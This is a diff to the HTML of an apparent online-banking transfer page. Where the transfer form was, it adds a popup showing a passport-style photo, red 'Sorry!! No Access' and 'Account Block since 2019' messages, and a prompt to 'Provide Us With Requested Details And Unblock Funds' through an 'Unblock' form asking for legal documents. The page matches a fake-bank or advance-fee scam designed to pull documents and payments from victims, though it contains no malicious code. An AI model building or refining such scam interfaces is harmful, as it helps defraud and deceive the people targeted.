@@ -6,6 +6,7 @@
 <meta http-equiv="X-UA-Compatible" content="IE-edge" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <link rel="stylesheet" href="acct.css" />
+<link rel="stylesheet" href="pop.css" />
   </head>
 
 
@@ -25,9 +26,28 @@
 <input type="email" name="Email Notification" placeholder="Enter Your Email" required/>
 <p>Description</p>
 <textarea name="message" id="message" placeholder="Description" style="height:50px;  resize: vertical; width:100%;" /> </textarea>
-<input type="submit" name=""  value="Transfer" />
+<a href="#"><input type="submit" name=""  value="Transfer" /></a>
 </form>
 </div>
+<div class="popup">
+        <button id="close">&times;</button>
+
+          <div class="text-right" style="text-align:center;">
+        <img src="passport.jpg" style="width:30%; height:50%; border-radius:100%;" />
+        <h2 style="color:red">Sorry!! No Access</h2>
+      <h3 style="color:red">  Account Block since 2019</h3>
+        </div>
+       <h3>Follow The Process </h3>
+       <h3>Provide Us With Requested Details And Unblock Funds </h3>
+        <a class="af"href="#" onclick="openForm()">Unblock</a>
+<div id="myForm" class="showme-popup">
+<h6> legal document</h6>
+<h6> legal document</h6>
+<h6> legal document</h6>
+  <a class="af"href="#"  onclick="closeForm()">x cancel </a>
+</div>
+    </div>
+    <script src="valid.js"></script>
 
 
   </body>
